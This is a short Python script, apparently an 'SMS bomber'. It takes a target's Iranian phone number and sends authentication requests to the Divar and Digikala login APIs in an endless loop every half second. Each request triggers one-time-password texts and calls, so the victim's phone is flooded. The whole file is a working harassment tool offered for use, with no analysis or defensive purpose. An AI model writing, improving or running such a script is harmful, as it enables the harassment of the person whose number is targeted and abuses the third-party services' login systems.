#import
import requests, time
def bomber(x,y,z):
    send = requests.post(url = x, json = y)
    print('send massage code',send.status_code,'for number:', z)
#varible
phone = input('enter num example 9012345678: ')
number = '+98' + phone
#json
json1 = {"phone": phone}
json2 = {'backUrl': "/", 'username': '0'+phone, 'otp_call': 'false'}
json3 = {'backUrl': "/", 'username': '0'+phone, 'otp_call': 'true'}
#API
url1 = "https://api.divar.ir/v5/auth/authenticate"
url2 = "https://api.digikala.com/v1/user/authenticate/"
#run
while True:
    bomber(url1, json1, number)
    bomber(url2, json2, number)
    bomber(url2,json3,number)

    time.sleep(0.5)